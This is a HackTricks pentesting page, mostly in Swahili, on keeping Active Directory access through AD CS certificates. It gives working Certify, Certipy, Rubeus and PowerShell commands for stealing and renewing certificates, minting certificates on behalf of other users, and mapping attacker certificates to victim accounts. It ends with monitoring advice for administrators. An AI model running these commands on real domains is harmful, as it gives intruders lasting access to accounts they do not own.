# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Huu ni muhtasari mfupi wa sura za account persistence kutoka katika utafiti bora wa [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**<sup>[[7]](#references)</sup>

## Understanding Active User Credential Theft with Certificates – PERSIST1

Katika hali ambapo certificate inayoruhusu domain authentication inaweza kuombwa na user, attacker anaweza kuomba na kuiba certificate hii ili kudumisha persistence kwenye network. Kwa default, template ya `User` katika Active Directory inaruhusu maombi kama hayo, ingawa wakati mwingine inaweza kuwa disabled.<sup>[[3]](#references)[[7]](#references)</sup>

Kwa kutumia [Certify](https://github.com/GhostPack/Certify) au [Certipy](https://github.com/ly4k/Certipy), unaweza kutafuta templates zilizo enabled zinazoruhusu client authentication kisha kuomba moja:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Newer Certify 2.0 syntax with filtering to enabled client-auth templates
Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Nguvu ya certificate iko katika uwezo wake wa kuthibitisha utambulisho kama user anayemiliki, bila kujali mabadiliko ya password, mradi certificate ibaki valid.

Unaweza kubadilisha PEM kuwa PFX na kuitumia kupata TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Kumbuka: Ikichanganywa na techniques nyingine (tazama sehemu za THEFT), certificate-based auth huwezesha persistent access bila kugusa LSASS na hata kutoka kwenye contexts zisizo na elevated privileges.

## Kupata Machine Persistence kwa kutumia Certificates - PERSIST2

Ikiwa attacker ana elevated privileges kwenye host, anaweza ku-enroll machine account ya mfumo uliocompromise kwa certificate akitumia template chaguo-msingi ya `Machine`. Kuauthenticate kama machine huwezesha S4U2Self kwa local services na kunaweza kutoa host persistence ya kudumu:<sup>[[3]](#references)[[7]](#references)</sup>
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Kuendeleza Persistence Kupitia Certificate Renewal - PERSIST3

Kutumia vibaya vipindi vya uhalali na renewal vya certificate templates humruhusu mshambuliaji kudumisha access ya muda mrefu. Ikiwa una certificate iliyotolewa hapo awali pamoja na private key yake, unaweza ku-renew kabla haija-expire ili kupata credential mpya yenye muda mrefu wa uhalali bila kuacha request artifacts za ziada zinazohusishwa na principal wa awali.<sup>[[3]](#references)[[7]](#references)</sup>
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Ushauri wa kiutendaji: Fuatilia muda wa matumizi wa faili za PFX zilizo chini ya udhibiti wa attacker na uzifanyie renewal mapema. Renewal inaweza pia kusababisha certificates zilizosasishwa kujumuisha extension ya kisasa ya SID mapping, na kuzifanya ziendelee kutumika chini ya sheria kali zaidi za DC mapping (tazama sehemu inayofuata).

## Kuweka Mappings za Certificate Zilizo Wazi (altSecurityIdentities) – PERSIST4

Ikiwa unaweza kuandika kwenye attribute ya `altSecurityIdentities` ya account lengwa, unaweza ku-map certificate inayodhibitiwa na attacker kwa account hiyo moja kwa moja. Hii hudumu licha ya mabadiliko ya password na, unapotumia strong mapping formats, hubaki ikifanya kazi chini ya utekelezaji wa kisasa wa DC.<sup>[[2]](#references)</sup>

Mtiririko wa kiwango cha juu:

1. Pata au issue client-auth certificate unayoidhibiti (kwa mfano, enroll `User` template kama wewe mwenyewe).
2. Extract strong identifier kutoka kwenye certificate (Issuer+Serial, SKI, au SHA1-PublicKey).
3. Ongeza explicit mapping kwenye `altSecurityIdentities` ya victim principal ukitumia identifier hiyo.
4. Authenticate kwa kutumia certificate yako; DC ita-map certificate hiyo kwa victim kupitia explicit mapping.

Mfano (PowerShell) ukitumia strong Issuer+Serial mapping:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Kisha thibitisha utambulisho kwa kutumia PFX yako. Certipy itapata TGT moja kwa moja:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Kuunda Mipangilio Imara ya `altSecurityIdentities`

Kwa vitendo, mipangilio ya **Issuer+Serial** na **SKI** ndiyo miundo imara iliyo rahisi zaidi kuunda kutoka kwa cheti kinachoshikiliwa na attacker. Hili ni muhimu baada ya **Februari 11, 2025**, wakati DCs zinatumia **Full Enforcement** kwa chaguo-msingi na mipangilio dhaifu inaacha kuwa ya kuaminika.<sup>[[1]](#references)</sup>
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Maelezo
- Tumia aina thabiti za mapping pekee: `X509IssuerSerialNumber`, `X509SKI`, au `X509SHA1PublicKey`. Miundo dhaifu (Subject/Issuer, Subject-only, RFC822 email) imepitwa na wakati na inaweza kuzuiwa na sera ya DC.
- Mapping hufanya kazi kwenye objects za **user** na **computer**, kwa hivyo ruhusa ya kuandika kwenye `altSecurityIdentities` ya account ya computer inatosha kudumu kama mashine hiyo.
- Msururu wa cert lazima ujengwe hadi kwenye root inayoaminika na DC. Enterprise CAs zilizo kwenye NTAuth kwa kawaida huaminika; baadhi ya mazingira pia huamini public CAs.
- Authentication ya Schannel bado ni muhimu kwa persistence hata PKINIT inaposhindwa kwa sababu DC haina Smart Card Logon EKU au inarudisha `KDC_ERR_PADATA_TYPE_NOSUPP`.

#### `Issuer/SID` explicit mappings za 2025+

Kwenye domain controllers za **Windows Server 2022+** zilizowekewa security update ya **Septemba 9, 2025**, Microsoft iliongeza format nyingine ya strong explicit mapping inayovutia kwa persistence kwa sababu hudumu baada ya certificate kutolewa upya kutoka CA hiyo hiyo:<sup>[[6]](#references)</sup>
```powershell
# Same issuer formatting rules as Issuer+Serial
$Issuer = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SID    = 'S-1-5-21-1111111111-2222222222-3333333333-1105'
$Map    = "X509:<I>$Issuer<SID>$SID"
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Kivitendo, hii inatofautiana na strong formats za zamani:
- `Issuer+Serial` hufunga **certificate moja mahususi**.
- `SKI` / `SHA1-PUKEY` hufunga **keypair moja**.
- `Issuer/SID` hufunga **CA inayotoa + SID ya target**, hivyo certificates zilizofanyiwa renewal au reissue kutoka kwa CA hiyo hiyo zitaendelea kufanya kazi bila kuandika upya `altSecurityIdentities`.

Mahitaji na tahadhari
- Certificate inayowasilishwa kwa logon lazima iwe na SID ya account ya target katika SID security extension.
- Format hii haisaidii kwa certificates za mtindo wa `ESC9` / `ESC16` ambazo huacha SID extension; katika hali hizo tumia `Issuer+Serial`, `SKI`, au `SHA1-PUKEY`.

Kwa maelezo zaidi kuhusu weak explicit mappings na attack paths, tazama:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent kama Persistence – PERSIST5

Ukipata Certificate Request Agent/Enrollment Agent certificate halali, unaweza kutengeneza certificates mpya zenye uwezo wa logon kwa niaba ya users wakati wowote na kuweka agent PFX offline kama persistence token. Abuse workflow:<sup>[[7]](#references)</sup>
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Kuondoa certificate ya agent au ruhusa za template kunahitajika ili kuondoa persistence hii.

Maelezo ya kiutendaji
- Matoleo ya kisasa ya `Certipy` yanaunga mkono `-on-behalf-of` na `-renew`, hivyo attacker mwenye Enrollment Agent PFX anaweza kutengeneza leaf certificates na baadaye kuzihuisha bila kugusa tena akaunti ya awali inayolengwa.<sup>[[4]](#references)</sup>
- Ikiwa upatikanaji wa TGT unaotegemea PKINIT hauwezekani, certificate ya on-behalf-of inayotokana bado inaweza kutumika kwa Schannel authentication kwa `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.<sup>[[5]](#references)</sup>

## Kutumia Certificates Zilizohifadhiwa Wakati PKINIT Inaposhindwa

Ikiwa DC haina certificate yenye uwezo wa Smart Card Logon, certificate logon kupitia PKINIT inaweza kushindwa kwa `KDC_ERR_PADATA_TYPE_NOSUPP`. Hilo **haliondoi** persistence primitive: PFX hiyo hiyo mara nyingi bado inaweza kutumika kwa LDAP access yenye Schannel authentication.<sup>[[5]](#references)</sup>
```bash
# LDAPS / Schannel shell as the mapped principal
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell

# LDAP StartTLS fallback if 636 is filtered but 389/TLS is reachable
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell -ldap-scheme ldap -ldap-port 389
```
Hii ni muhimu hasa baada ya PERSIST4/PERSIST5 kwa sababu unaweza kuendelea kufanya kazi kutoka Linux/macOS na kuunganisha vitendo vingine vya directory persistence kama vile kuweka [shadow credentials](../acl-persistence-abuse/shadow-credentials.md) au kuhariri delegation attributes zinazoweza kuandikwa.

## 2025 Strong Certificate Mapping Enforcement: Athari kwa Persistence

Microsoft KB5014754 ilianzisha Strong Certificate Mapping Enforcement kwenye domain controllers. Tangu **Februari 11, 2025**, DCs hutumia **Full Enforcement** kwa mappings dhaifu/zisizo wazi kwa chaguo-msingi, na kuanzia sasisho la usalama la **Septemba 9, 2025**, DCs zilizopachikwa sasisho hazitumii tena fallback ya zamani ya Compatibility mode.<sup>[[1]](#references)</sup> Athari za kiutendaji:

- Vyeti vya kabla ya 2022 ambavyo havina SID mapping extension vinaweza kushindwa kutumia implicit mapping wakati DCs ziko kwenye Full Enforcement. Attackers wanaweza kudumisha access kwa ama kufanya upya vyeti kupitia AD CS (ili kupata SID extension) au kuweka strong explicit mapping kwenye `altSecurityIdentities` (PERSIST4).
- Explicit mappings zinazotumia strong formats (`Issuer+Serial`, `SKI`, `SHA1-PUKEY`, na kwenye DCs za kisasa `Issuer/SID`) zinaendelea kufanya kazi. Weak formats (Issuer/Subject, Subject-only, RFC822) zinaweza kuzuiwa na zinapaswa kuepukwa kwa persistence.
- Ikiwa weak mappings bado zinaonekana kufanya kazi, chukulia kuwa umefikia DC ambayo haijapachikwa sasisho au imepangwa tofauti, badala ya kuichukulia kama njia ya kuaminika ya long-term persistence.
- Njia za issuance za mtindo wa `ESC9` / `ESC16` zinazozuia SID extension kufanya `Issuer/SID` isitumikike, hivyo fallback strong mappings au kufanya renewal kupitia template ya kawaida huwa chaguo la kiutendaji la persistence.

Administrators wanapaswa kufuatilia na kutoa alerts kuhusu:
- Mabadiliko kwenye `altSecurityIdentities` na issuance/renewals za Enrollment Agent na User certificates.
- CA issuance logs kwa requests za on-behalf-of na renewal patterns zisizo za kawaida.

## References

- [1] [Microsoft Support – KB5014754: Certificate-based authentication changes on Windows domain controllers](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [3] [GhostPack/Certify Wiki – Account Persistence Techniques](https://github.com/GhostPack/Certify/wiki/2-%E2%80%90-Account-Persistence-Techniques)
- [4] [Certipy Wiki – Command Reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [5] [Almond Offensive Security – Authenticating with certificates when PKINIT is not supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
- [6] [Microsoft Community Hub – Introducing a new Issuer/SID AltSecID](https://techcommunity.microsoft.com/blog/publicsectorblog/introducing-a-new-issuersid-altsecid/4454231)
- [7] [SpecterOps – Certified Pre-Owned: Abusing Active Directory Certificate Services](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)

{{#include ../../../banners/hacktricks-training.md}}
